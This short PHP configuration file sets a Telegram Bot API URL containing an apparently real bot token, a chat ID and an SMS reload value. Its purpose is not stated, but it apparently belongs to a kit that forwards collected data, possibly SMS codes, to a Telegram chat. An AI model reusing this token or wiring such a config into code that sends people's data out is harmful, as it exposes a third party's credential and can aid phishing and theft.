<?php

$METRI_TOKEN = "https://api.telegram.org/bot1962498942:AAG2piGtiSknV1OwKuUbYOyBl6BbpXl1td8";

$chat_id = "1691543399";

$sms_reload = '2';

?>